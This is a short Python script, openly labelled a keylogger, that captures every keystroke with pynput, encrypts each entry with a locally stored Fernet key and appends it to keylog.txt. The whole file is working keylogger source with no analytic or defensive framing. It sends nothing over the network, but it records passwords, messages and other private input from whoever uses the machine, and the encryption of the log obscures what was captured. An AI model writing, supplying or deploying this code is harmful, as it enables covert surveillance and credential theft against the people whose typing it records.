from pynput import keyboard
from cryptography.fernet import Fernet
import os

# Generate and save an encryption key (only run once)
def generate_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

# Load the saved encryption key
def load_key():
    return open("key.key", "rb").read()

# Encrypt and log keystrokes
def on_press(key):
    try:
        log = str(key.char)
    except AttributeError:
        log = str(key)

    encrypted_log = cipher.encrypt(log.encode())
    with open(log_file, "ab") as f:
        f.write(encrypted_log + b'\n')

# Main keylogger functionality
def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    log_file = "keylog.txt"
    
    if not os.path.exists("key.key"):
        generate_key()  # Only needed if key doesn't exist

    key = load_key()
    cipher = Fernet(key)

    print("Keylogger started...")
    start_keylogger()
